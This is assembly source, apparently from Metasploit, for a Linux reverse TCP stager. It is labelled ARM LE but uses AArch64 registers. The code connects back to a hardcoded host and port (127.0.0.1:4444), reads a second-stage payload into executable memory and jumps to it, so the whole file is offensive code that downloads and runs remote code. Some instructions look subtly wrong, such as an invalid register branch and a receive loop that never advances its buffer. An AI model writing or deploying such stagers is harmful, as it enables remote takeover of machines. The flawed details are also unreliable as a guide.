#@
#
#        Name: stager_sock_reverse
#   Qualities: -
#     Authors: nemo <nemo [at] felinemenace.org>, tkmru
#     License: MSF_LICENSE
# Description:
#
#        Implementation of a Linux reverse TCP stager for ARM LE architecture.
#
#        Socket descriptor in x12.
#
#        Assemble with: as stager_sock_reverse.s -o stager_sock_reverse.o
#        Link with:     ld stager_sock_reverse.o -o stager_sock_reverse
#
# Meta-Information:
#
# meta-shortname=Linux Reverse TCP Stager
# meta-description=Connect back to the framework and run a second stage
# meta-authors=nemo <nemo [at] felinemenace.org>
# meta-os=linux
# meta-arch=armle
# meta-category=stager
# meta-connection-type=reverse
# meta-name=reverse_tcp
#@

.text
.globl _start
_start:
# int socket(int domain, int type, int protocol);
	ldr x8,=198        // __NR_socket
	mov x0,#2          // domain   = AF_INET
	mov x1,#1          // type     = SOCK_STREAM
	mov x2,#6          // protocol = IPPROTO_TCP
	svc 0
	cmp x0, #0
	blt failed
# int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	mov x12,x0         // sockfd
	ldr x8,=203        // __NR_connect
	adr x1, .
	add x1,x1,#196     // *addr
	mov x2,#16         // addrlen
	svc 0
	cmp x0, #0
	blt failed
# ssize_t read(int fd, void *buf, size_t len);
	mov x0,x12         // sockfd
	sub sp,sp,#4
	ldr x8,=63         // __NR_read
	mov x1,sp          // *buf (on the stack)
	mov x2,#4          // len
	svc 0
	cmn x0, #1
	beq failed
# round length
	ldr x1,[sp,#0]
	ldr x3,=0xfffff000
	and x1,x1,x3
	mov x2,#1
	lsl x2,x2,#12
# void *mmap2(void *addr, size_t length, int prot, int flags, int fd, off_t pgoffset);
	add x1,x1,x2       // length
	ldr x8,=222        // __NR_mmap
	ldr x0,=0xffffffff // *addr = NULL
	mov x2,#7          // prot  = PROT_READ | PROT_WRITE | PROT_EXEC
	ldr x3,=0x1022     // flags = MAP_ANON | MAP_PRIVATE
	mov x4,x0          // fd
	mov x5,#0          // pgoffset
	svc 0
	cmn x0, #1
	beq failed
# recv loop
# ssize_t recv(int sockfd, void *buf, size_t len, int flags);
	ldr x8,=63         // __NR_read
	mov x1,x0          // *buf
	mov x0,x12         // sockfd
	mov x3,#0          // flags
# remove blocksize from total length
loop:
	ldr x2,[sp,#0]
	sub x2,x2,#1000
	str x2,[sp,#0]
	cmp x2, #0
	ble last
	mov x2,#1000       // len
	svc 0
	cmp x0, #0
	blt failed
	b loop
last:
	add x2,x2,#1000       // len
	svc 0
	cmp x0, #0
	blt failed
# branch to code
	b x1
failed:
	ldr x8,=93         // __NR_exit
	mov x0, #1
	svc 0
# addr
# port: 4444 , sin_fam = 2
.word   0x5c110002
# ip: 127.0.0.1
.word   0x0100007f
#.word   0x01aca8c0
